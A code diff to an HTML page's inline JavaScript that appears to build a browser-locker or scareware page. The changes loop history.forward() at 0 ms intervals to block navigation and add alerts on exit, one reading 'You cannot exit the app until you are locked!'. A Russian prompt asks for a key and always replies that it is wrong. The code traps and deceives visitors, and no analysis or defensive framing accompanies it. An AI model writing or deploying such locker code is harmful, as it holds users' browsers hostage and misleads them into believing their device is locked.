@@ -11,16 +11,16 @@ background:grey;
     <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
 </head>
 <script>
-window.history.forward(); 
 function noBack() { 
-window.history.forward(); 
+alert('You cannot exit the app until you locked!')
+window.history.forward();
 } 
-setInterval(noBack,1)
+setInterval(noBack,0)
 function preventBack() { 
 window.history.forward();  
 } 
-setTimeout(preventBack, 1); 
-window.onunload = function () { null }; 
+setTimeout(preventBack, 0); 
+window.onunload = function () { alert('You cannot exit the app until you are locked!') }; 
 function reg() {
 prompt('Введите ваш ключ:')
 alert('Неправильный ключ!')
